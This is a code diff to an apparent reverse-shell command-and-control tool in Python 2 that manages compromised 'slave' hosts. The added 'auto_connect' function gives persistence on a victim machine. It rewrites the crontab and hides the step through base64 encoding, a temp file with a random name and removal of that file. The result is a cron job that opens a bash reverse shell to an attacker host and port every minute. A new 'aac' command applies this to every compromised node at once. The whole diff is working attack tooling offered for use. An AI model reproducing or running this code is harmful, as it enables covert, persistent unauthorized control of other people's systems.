@@ -5,6 +5,8 @@ import socket
 import threading
 import time
 import hashlib
+import random
+import string
 import sys
 import os
 import readline
@@ -85,6 +87,9 @@ def transfer(h):
         socket_fd.close()
         slave.remove_node()
 
+def random_string(length, chars):
+    return "".join([random.choice(chars) for i in range(length)])
+
 
 class Slave():
     def __init__(self, socket_fd):
@@ -128,6 +133,37 @@ class Slave():
             self.remove_node()
         self.interactive = False
         time.sleep(0.125)
+
+    def save_crontab(self, target_file):
+        command = "crontab -l > %s" % (target_file)
+        self.send_command_print(command)
+
+    def auto_connect(self, target_host, target_port):
+        # 1. Save old crontab
+        Log.info("Saving old crontab")
+        chars = string.letters + string.digits
+        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
+        self.save_crontab(target_file)
+        # 2. Delete old reverse shell tasks
+        Log.info("Removing old tasks in crontab...")
+        command = 'sed -i "/bash/d" %s' % (target_file)
+        self.send_command(command)
+        # 3. Add a new task
+        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
+        Log.info("Add new tasks : %s" % (content))
+        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
+        self.send_command(command)
+        # 4. Rescue crontab file
+        Log.info("Rescuing crontab file...")
+        command = 'crontab %s' % (target_file)
+        self.send_command(command)
+        # 5. Delete temp file
+        Log.info("Deleting temp file...")
+        command = "rm -rf %s" % (target_file)
+        self.send_command(command)
+        # 6. Receving buffer data
+        print recvall(self.socket_fd)
+
 
     def remove_node(self):
         Log.error("Removing Node!")
@@ -177,7 +213,9 @@ def show_commands():
     print "        8. [setl] : set local execute"
     print "        9. [setr] : set remote execute"
     print "        10. [d] : delete node"
-    print "        11. [q|quit|exit] : interact an shell"
+    print "        10. [ac] : auto connection"
+    print "        11. [aac] : all node auto connction"
+    print "        12. [q|quit|exit] : exit"
 
 def signal_handler(ignum, frame):
     print ""
@@ -310,6 +348,17 @@ def main():
             current_slave.interactive_shell()
         elif command == "d":
             current_slave.remove_node()
+        elif command == "ac":
+            target_host = raw_input("Target host (192.168.1.1) : ") or ("192.168.1.1")
+            target_port = int(raw_input("Target port (8080) : ") or ("8080"))
+            Log.info("Changing crontab...")
+            current_slave.auto_connect(target_host, target_port)
+        elif command == "aac":
+            target_host = raw_input("Target host (192.168.1.1) : ") or ("192.168.1.1")
+            target_port = int(raw_input("Target port (8080) : ") or ("8080"))
+            for i in slaves.keys():
+                slave = slaves[i]
+                slave.auto_connect(target_host, target_port)
         elif command == "q" or command == "quit" or command == "exit":
             EXIT_FLAG = True
             # TODO : release all resources before closing
